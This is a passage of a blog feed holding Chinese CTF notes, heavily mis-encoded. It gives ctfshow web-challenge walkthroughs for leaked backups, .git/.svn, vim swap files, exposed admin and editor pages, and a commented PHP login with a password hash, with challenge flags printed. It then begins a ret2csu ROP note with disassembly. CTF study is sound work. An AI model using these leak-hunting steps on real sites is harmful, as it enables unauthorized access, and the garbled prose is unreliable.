class="line">User-agent: *</span><br><span class="line">Disallow: /flagishere.txt</span><br></pre></td></tr></table></figure><p>â€‹è®¿é—®è¿™ä¸ªæ–‡ä»¶åå¾—åˆ° flagã€‚</p><h1 id="web5"><a class="markdownIt-Anchor" href="#web5">#</a> Web5ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šphps æºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</p><p>â€‹å‰ç½®çŸ¥è¯†ï¼š<strong>phps æ–‡ä»¶</strong>å°±æ˜¯ php çš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰ç›´æ¥é€šè¿‡ Web æµè§ˆå™¨æŸ¥çœ‹ php ä»£ç çš„å†…å®¹ã€‚</p><p>â€‹è®¿é—® index.phps æ–‡ä»¶ä¸‹è½½åæ‰“å¼€å³å¯å¾—åˆ° flagã€‚</p><h1 id="web6"><a class="markdownIt-Anchor" href="#web6">#</a> Web6ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šè§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â€ƒâ€ƒå¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€ï¼š</span><br><span class="line"></span><br><span class="line">tar</span><br><span class="line">tar.gz</span><br><span class="line">zip</span><br><span class="line">rar</span><br><span class="line">â€ƒâ€ƒå¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åï¼š</span><br><span class="line">web</span><br><span class="line">website</span><br><span class="line">backup</span><br><span class="line">back</span><br><span class="line">www</span><br><span class="line">wwwroot</span><br><span class="line">temp</span><br></pre></td></tr></table></figure><p>â€‹è®¿é—® www.zip è·å¾—æºç ï¼Œé‡Œé¢æœ‰ flagã€‚</p><h1 id="web7"><a class="markdownIt-Anchor" href="#web7">#</a> Web7ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p><p>â€‹git æ³„éœ²ï¼Œç›´æ¥è®¿é—® /.git/ å³å¯ï¼Œæˆ–è€… Githack ä¸€æŠŠæ¢­ã€‚</p><h1 id="web8"><a class="markdownIt-Anchor" href="#web8">#</a> Web8ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p><p>â€‹.svn æ³„éœ²ï¼Œç›´æ¥è®¿é—®ã€‚</p><h1 id="web9"><a class="markdownIt-Anchor" href="#web9">#</a> Web9ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒ vim æ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</p><pre><code>vimæ³„éœ²ï¼šå½“vimå¼‚å¸¸é€€å‡ºæ—¶ï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªç”¨äºå¤‡ä»½ç¼“å†²åŒºå†…å®¹çš„swpä¸´æ—¶æ–‡ä»¶ï¼Œæ¥è®°å½•äº†ç”¨æˆ·åœ¨éæ­£å¸¸å…³é—­vimç¼–è¾‘å™¨ä¹‹å‰æœªèƒ½åŠæ—¶ä¿å­˜çš„ä¿®æ”¹ï¼Œç”¨äºæ–‡ä»¶æ¢å¤ã€‚å‡å¦‚åŸæ–‡ä»¶åä¸ºindex.phpç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º.index.php.swpç¬¬äºŒæ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º.index.php.swoç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º.index.php.swn</code></pre><p>â€‹è®¿é—®è¿™ä¸ªæ–‡ä»¶ <code>index.php.swp</code> ï¼Œç„¶åè®°äº‹æœ¬æ‰“å¼€æ‹¿åˆ° flagã€‚</p><h1 id="web10"><a class="markdownIt-Anchor" href="#web10">#</a> Web10ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šcookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®ã€‚</p><p>â€‹æŠ“åŒ…ï¼Œåœ¨ cookie å¤„å‘ç° flagã€‚</p><h1 id="web11"><a class="markdownIt-Anchor" href="#web11">#</a> Web11ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šåŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œ<span class="exturl" data-url="aHR0cDovL3huLS1mbGFnLWY5NmczMTVnLmN0ZnNob3cuY29t">æ¯”å¦‚ flag.ctfshow.com</span> å°±éšè—äº†ä¸€æ¡ä¿¡æ¯</p><p>â€‹<span class="exturl" data-url="aHR0cHM6Ly9ib2NlLmFsaXl1bi5jb20vaG9tZSVFOSU4NyU4QyVFOSU5RCVBMiVFNiU5RiVBNSVFNCVCRiVBMSVFNiU4MSVBRiVFRiVCQyU4QyVFNCVCRCU4NiVFNiU5OCVBRiVFNiU4OCU5MSVFNCVCOCU4RCVFNyU5RiVBNSVFOSU4MSU5MyVFNCVCOCVCQSVFNSU5NSVBNSVFNiU5RiVBNSVFNCVCOCU4RCVFNSU4OCVCMCVFRiVCQyU4QyVFNCVCOCU4RCVFNyVBRSVBMSVFNCVCQSU4NiVFMyU4MCU4Mg==">https://boce.aliyun.com/home é‡Œé¢æŸ¥ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“ä¸ºå•¥æŸ¥ä¸åˆ°ï¼Œä¸ç®¡äº†ã€‚</span></p><h1 id="web12"><a class="markdownIt-Anchor" href="#web12">#</a> Web12ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šæœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </p><p>â€‹è®¿é—® robots.txt è·å–ä¸€äº›ä¿¡æ¯ï¼Œå°±æ˜¯ /admin/ ç›®å½•ï¼Œè®¿é—®åå¼¹å‡ºæ¥äº†ä¸ªç™»é™†æ¡†ï¼Œå¯†ç ä¸€èˆ¬æ˜¯ adminï¼Œå¯†ç åœ¨ index é¡µé¢æœ€ä¸‹é¢ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Help Line Number : 372619038</span><br></pre></td></tr></table></figure><h1 id="web13"><a class="markdownIt-Anchor" href="#web13">#</a> Web13ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šæŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </p><p>â€‹è¯»æºç ï¼Œå‘ç° document.pdf æ–‡ä»¶ï¼Œæ‰“å¼€å‘ç°äº†è´¦å·å¯†ç å’Œä¸€ä¸ªé¡µé¢ï¼Œè¿›å…¥è¿™ä¸ªæ–‡ä»¶åç™»é™†å‘ç° flagã€‚</p><h1 id="web14"><a class="markdownIt-Anchor" href="#web14">#</a> Web14ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šæœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦ (editor) çš„ä¿¡æ¯ï¼Œé»˜è®¤é…ç½®å®³æ­»äºº</p><p>â€‹ç›´æ¥è®¿é—® /editor/ ç›®å½•ï¼Œç‚¹æ’å…¥æ–‡ä»¶ï¼Œæ‰¾åˆ° flag æ–‡ä»¶çš„å¤§è‡´æ–‡ä»¶ç»“æ„ï¼Œç›¸å¯¹è·¯å¾„è®¿é—®å³å¯å¾—åˆ° flagã€‚</p><h1 id="web15"><a class="markdownIt-Anchor" href="#web15">#</a> Web15ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼›å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</p><p>â€‹ç¤¾å·¥é¢˜ï¼Œå¯¹çœŸæ­£æŠ€æœ¯æ²¡å•¥å¤ªå¤§çš„å…³ç³»ã€‚</p><p>â€‹ç›´æ¥æ‹‰åˆ°æœ€ä¸‹è¾¹ï¼Œç”µè¯å·ç å’Œé‚®ç®±éƒ½æœ‰ï¼Œurl ç›´æ¥è®¿é—® adminï¼Œè¿›å…¥ç™»é™†åå°ï¼Œä¹‹åå°±æ˜¯å¿˜è®°å¯†ç ï¼Œæç¤ºï¼šæˆ‘çš„æ‰€åœ¨åœ°æ˜¯å“ªä¸ªåŸå¸‚ï¼Ÿæ ¹æ® qq é‚®ç®±çš„ qq å·å‘ç°å±åœ°ï¼Œé€šè¿‡è¿™ä¸ªä¿®æ”¹å¯†ç å³å¯ã€‚</p><h1 id="web16"><a class="markdownIt-Anchor" href="#web16">#</a> Web16ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</p><p>â€‹æœ‰å¤§ä½¬ç”¨ Wappalyzer æ£€æµ‹åˆ°äº† PHPï¼Œä½†æ˜¯è®¿é—® tz.php çš„åŸå› æ˜¯å•¥ä¸æ˜¯å¾ˆæ¸…æ¥šã€‚æ‰“å¼€ tz.php ä¹‹åæ‰¾åˆ° PHP ç›¸å…³å‚æ•°ï¼Œæ‰“å¼€ PHPIINFO ç„¶åæœç´¢ ctfshow å³å¯å‘ç° flagã€‚</p><h1 id="web17"><a class="markdownIt-Anchor" href="#web17">#</a> Web17ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå¤‡ä»½çš„ sql æ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</p><p>â€‹sql æ–‡ä»¶çš„å¤‡ä»½ä¸€èˆ¬ä¸º backup.sqlï¼Œæ‰€ä»¥è®¿é—®ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ï¼Œè®°äº‹æœ¬æ‰“å¼€ä¹‹åæ‰¾åˆ°äº†å¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `ctfshow_secret` <span class="keyword">VALUES</span> (<span class="string">&#x27;ctfshow&#123;40b3ed5b-2454-49c7-a6ad-77e5cc738e2f&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="web18"><a class="markdownIt-Anchor" href="#web18">#</a> Web18ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç© 101 åˆ†ç»™ä½  flag</p><p>â€‹è¯» js æºç ï¼Œæ‰¾åˆ°ä»¥ä¸‹é€»è¾‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹unicode è§£ç æ˜¯ï¼šä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹ï¼Œæç¤ºè¯»å– 110.phpï¼Œè¯»å–åè·å¾— flagã€‚</p><h1 id="web19"><a class="markdownIt-Anchor" href="#web19">#</a> Web19ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</p><p>â€‹è¯»æºç ï¼Œæ‰¾åˆ°äº†è¢«æ³¨é‡Šçš„ php ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    &lt;!--</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure><p>â€‹è´¦å·å¯†ç éƒ½æœ‰äº†ï¼Œåç«¯æŠ“åŒ…æ”¹åŒ…å‘é€å³å¯è·å¾— flagã€‚</p><h1 id="web20"><a class="markdownIt-Anchor" href="#web20">#</a> Web20ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šmdb æ–‡ä»¶æ˜¯æ—©æœŸ asp+access æ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</p><p>â€‹æ‰«åå°å‘ç°äº† db æ–‡ä»¶ï¼Œä¸‹è½½å³å¯ï¼Œä¹‹åç”¨æ•°æ®åº“ç®¡ç†å·¥å…·æ‰“å¼€å³å¯å¾—åˆ° flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ9ï¼‰-ä¸­çº§ROP--ret2csu</title>
      <link href="/posts/c8624158.html"/>
      <url>/posts/c8624158.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°9-ä¸­çº§ropret2csu"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°9-ä¸­çº§ropret2csu">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ9ï¼‰- ä¸­çº§ ROPâ€“ret2csu</h1><h2 id="å‰ç½®çŸ¥è¯†"><a class="markdownIt-Anchor" href="#å‰ç½®çŸ¥è¯†">#</a> å‰ç½®çŸ¥è¯†</h2><p>â€‹é¦–å…ˆæ˜¯ 64 ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼ï¼šå‰å…­ä¸ªå‚æ•°æ˜¯ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨ï¼šrdiã€rsiã€rdxã€rcxã€r8ã€r9ï¼Œä¹‹åçš„é€šè¿‡æ ˆä¼ å‚ã€‚</p><p>â€‹æ¯”å¦‚ï¼š</p><blockquote><p>ä¼ å‚å‡½æ•°å¤§äº 7 ä¸ªï¼š</p><p>H(a,b,c,d,e,f,g,h)</p><p>a-&gt;%rdiã€b-&gt;%rsiã€c-&gt;%rdxã€d-&gt;%rcxã€e-&gt;%r8ã€f-&gt;%r9</p><p>h-&gt;(%esp)</p><p>g-&gt;(%esp)</p><p>call H</p></blockquote><p>â€‹å…ˆçœ‹çœ‹å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">H</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">1</span>,b = <span class="number">2</span>,c = <span class="number">3</span>,d = <span class="number">4</span>,e = <span class="number">5</span>,f = <span class="number">6</span>,g = <span class="number">7</span>,h = <span class="number">8</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,H(a,b,c,d,e,f,g,h));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">H</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+c+d+e+f+g+h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹ååæ±‡ç¼–ä¸€ä¸‹ main å‡½æ•°å’Œ H å‡½æ•°çš„ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0000000000001149 &lt;main&gt;:</span><br><span class="line">    1149:       f3 0f 1e fa             endbr64</span><br><span class="line">    114d:       55                      push   rbp</span><br><span class="line">    114e:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    1151:       48 83 ec 20             sub    rsp,0x20</span><br><span class="line">    1155:       c7 45 e0 01 00 00 00    mov    DWORD PTR [rbp-0x20],0x1</span><br><span class="line">    115c:       c7 45 e4 02 00 00 00    mov    DWORD PTR [rbp-0x1c],0x2</span><br><span class="line">    1163:       c7 45 e8 03 00 00 00    mov    DWORD PTR [rbp-0x18],0x3</span><br><span class="line">    116a:       c7 45 ec 04 00 00 00    mov    DWORD PTR [rbp-0x14],0x4</span><br><span class="line">    1171:       c7 45 f0 05 00 00 00    mov    DWORD PTR [rbp-0x10],0x5</span><br><span class="line">    1178:       c7 45 f4 06 00 00 00    mov    DWORD PTR [rbp-0xc],0x6</span><br><span class="line">    117f:       c7 45 f8 07 00 00 00    mov    DWORD PTR [rbp-0x8],0x7</span><br><span class="line">    1186:       c7 45 fc 08 00 00 00    mov    DWORD PTR [rbp-0x4],0x8</span><br><span class="line">    118d:       44 8b 4d f4             mov    r9d,DWORD PTR [rbp-0xc]</span><br><span class="line">    1191:       44 8b 45 f0             mov    r8d,DWORD PTR [rbp-0x10]</span><br><span class="line">    1195:       8b 4d ec                mov    ecx,DWORD PTR [rbp-0x14]</span><br><span class="line">    1198:       8b 55 e8                mov    edx,DWORD PTR [rbp-0x18]</span><br><span class="line">    119b:       8b 75 e4                mov    esi,DWORD PTR [rbp-0x1c]</span><br><span class="line">    119e:       8b 45 e0                mov    eax,DWORD PTR [rbp-0x20]</span><br><span class="line">    11a1:       8b 7d fc                mov    edi,DWORD PTR [rbp-0x4]</span><br><span class="line">    11a4:       57                      push   rdi</span><br><span class="line">    11a5:       8b 7d f8                mov    edi,DWORD PTR [rbp-0x8]</span><br><span class="line">    11a8:       57                      push   rdi</span><br><span class="line">    11a9:       89 c7                   mov    edi,eax</span><br><span class="line">    11ab:       e8 1e 00 00 00          call   11ce &lt;H&gt;</span><br><span class="line">    11b0:       48 83 c4 10             add    rsp,0x10</span><br><span class="line">    11b4:       89 c6                   mov    esi,eax</span><br><span class="line">    11b6:       48 8d 3d 47 0e 00 00    lea    rdi,[rip+0xe47]        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    11bd:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">    11c2:       e8 89 fe ff ff          call   1050 &lt;printf@plt&gt;</span><br><span class="line">    11c7:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">    11cc:       c9                      leave</span><br><span class="line">    11cd:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000000011ce &lt;H&gt;:</span><br><span class="line">    11ce:       f3 0f 1e fa             endbr64</span><br><span class="line">    11d2:       55                      push   rbp</span><br><span class="line">    11d3:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    11d6:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">    11d9:       89 75 f8                mov    DWORD PTR [rbp-0x8],esi</span><br><span class="line">    11dc:       89 55 f4                mov    DWORD PTR [rbp-0xc],edx</span><br><span class="line">    11df:       89 4d f0                mov    DWORD PTR [rbp-0x10],ecx</span><br><span class="line">    11e2:       44 89 45 ec             mov    DWORD PTR [rbp-0x14],r8d</span><br><span class="line">    11e6:       44 89 4d e8             mov    DWORD PTR [rbp-0x18],r9d</span><br><span class="line">    11ea:       8b 55 fc                mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">    11ed:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">    11f0:       01 c2                   add    edx,eax</span><br><span class="line">    11f2:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]</span><br><span class="line">    11f5:       01 c2                   add    edx,eax</span><br><span class="line">    11f7:       8b 45 f0                mov    eax,DWORD PTR [rbp-0x10]</span><br><span class="line">    11fa:       01 c2                   add    edx,eax</span><br><span class="line">    11fc:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">    11ff:       01 c2                   add    edx,eax</span><br><span class="line">    1201:       8b 45 e8                mov    eax,DWORD PTR [rbp-0x18]</span><br><span class="line">    1204:       01 c2                   add    edx,eax</span><br><span class="line">    1206:       8b 45 10                mov    eax,DWORD PTR [rbp+0x10]</span><br><span class="line">    1209:       01 c2                   add    edx,eax</span><br><span class="line">    120b:       8b 45 18                mov    eax,DWORD PTR [rbp+0x18]</span><br><span class="line">    120e:       01 d0                   add    eax,edx</span><br><span class="line">    1210:       5d                      pop    rbp</span><br><span class="line">    1211:       c3                      ret</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜æ˜¾çš„å°±æ˜¯å‰å…­ä¸ªå‚æ•°æ˜¯å¯„å­˜å™¨ä¼ å‚ï¼Œå‰©ä¸‹ä¸¤ä¸ªå°±æ˜¯æ ˆä¼ å‚ã€‚</p><h2 id="libc_csu_initå‡½æ•°åŸºç¡€"><a class="markdownIt-Anchor" href="#libc_csu_initå‡½æ•°åŸºç¡€">#</a>  <code>libc_csu_init</code>  å‡½æ•°åŸºç¡€ï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220 ; void _libc_csu_init(void)</span><br><span class="line">.text:0000000000001220                 public __libc_csu_init</span><br><span class="line">.text:0000000000001220 __libc_csu_init proc near               ; DATA XREF: _start+1Aâ†‘o</span><br><span class="line">.text:0000000000001220 ; __unwind &#123;</span><br><span class="line">.text:0000000000001220                 endbr64</span><br><span class="line">.text:0000000000001224                 push    r15</span><br><span class="line">.text:0000000000001226                 lea     r15, __frame_dummy_init_array_entry</span><br><span class="line">.text:000000000000122D                 push    r14</span><br><span class="line">.text:000000000000122F                 mov     r14, rdx</span><br><span class="line">.text:0000000000001232                 push    r13</span><br><span class="line">.text:0000000000001234                 mov     r13, rsi</span><br><span class="line">.text:0000000000001237                 push    r12</span><br><span class="line">.text:0000000000001239                 mov     r12d, edi</span><br><span class="line">.text:000000000000123C                 push    rbp</span><br><span class="line">.text:000000000000123D                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000001244                 push    rbx</span><br><span class="line">.text:0000000000001245                 sub     rbp, r15</span><br><span class="line">.text:0000000000001248                 sub     rsp, 8</span><br><span class="line">.text:000000000000124C                 call    _init_proc</span><br><span class="line">.text:0000000000001251                 sar     rbp, 3</span><br><span class="line">.text:0000000000001255                 jz      short loc_1276</span><br><span class="line">.text:0000000000001257                 xor     ebx, ebx</span><br><span class="line">.text:0000000000001259                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000001260</span><br><span class="line">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54â†“j</span><br><span class="line">.text:0000000000001260                 mov     rdx, r14</span><br><span class="line">.text:0000000000001263                 mov     rsi, r13</span><br><span class="line">.text:0000000000001266                 mov     edi, r12d</span><br><span class="line">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class="line">.text:000000000000126D                 add     rbx, 1</span><br><span class="line">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000001274                 jnz     short loc_1260</span><br><span class="line">.text:0000000000001276</span><br><span 